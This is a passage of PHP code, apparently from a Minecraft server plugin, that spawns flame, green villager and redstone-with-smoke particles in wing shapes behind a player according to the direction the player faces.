					$level->addParticle(new FlameParticle(new Vector3($x, $y + 1.4, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 1.4, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 1.2, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 1.2, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 1, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 1, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 0.8, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 0.8, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x, $y + 0.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.4, $y + 0.4, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x - 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new FlameParticle(new Vector3($x + 0.6, $y + 0.4, $z + 0.3)));
					
				}
			}
			
			//green wings
			if(in_array($name, $this->plugin->particle14)) {
				$x = $player->getX();
				$y = $player->getY();
				$z = $player->getZ();
				if ($player->getDirection() === 0) {
					
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.8, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.8, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.2, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.2, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.2, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.6, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 2, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 2, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.8, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.8, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.8)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.8)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.2, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1.2, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 1, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.6, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.6)));
					
				} elseif ($player->getDirection() === 2) {
					
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.8, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.8, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.2, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.2, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.2, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.6, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 2, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 2, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.8, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.8, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.8)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.8)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.2, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1.2, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 1, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.6, $z)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.4)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.6)));
					
				} elseif ($player->getDirection() === 1) {
					
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1.2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x , $y + 1.2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1.2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 1, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 0.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 1.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 1.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.8, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.8, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 1.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1.2, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 0.8, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 0.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 0.6, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 0.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 0.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 0.4, $z - 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 0.4, $z - 0.3)));
					
				} elseif ($player->getDirection() === 3) {
					
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1.2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x , $y + 1.2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1.2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 1, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 0.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 1.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 1.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.8, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.8, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 1.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 1.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1.2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1.2, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 1, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 1, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.2, $y + 0.8, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x, $y + 0.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 0.6, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.4, $y + 0.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.4, $y + 0.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x - 0.6, $y + 0.4, $z + 0.3)));
					$level->addParticle(new HappyVillagerParticle(new Vector3($x + 0.6, $y + 0.4, $z + 0.3)));
					
				}
			}
			
			//redstone wings
			if(in_array($name, $this->plugin->particle13)) {
				$x = $player->getX();
				$y = $player->getY();
				$z = $player->getZ();
				
				if ($player->getDirection() === 0) {
					
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 2, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 2, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.8, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.8, $z + 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.8)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.8)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.4, $z)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.2, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1.2, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 1, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.6, $z)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.8, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.8, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.6, $z - 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.6, $z + 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.4, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.4, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.2, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.2, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1.2, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 1, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.8, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.6, $z)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.4, $z - 0.6)));
					$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 0.4, $z + 0.6)));
					
				} elseif ($player->getDirection() === 2) {
					
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 2, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 2, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.8, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.8, $z + 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.8)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.8)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.6, $z - 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.6, $z + 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.4, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.4, $z)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.4, $z + 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.2, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1.2, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 1, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.6)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.8, $z - 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.8, $z + 0.2)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.6, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.6, $z)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.6, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.4, $z + 0.4)));
					$level->addParticle(new RedstoneParticle(new Vector3($x + 0.3, $y + 0.4, $z - 0.6)));
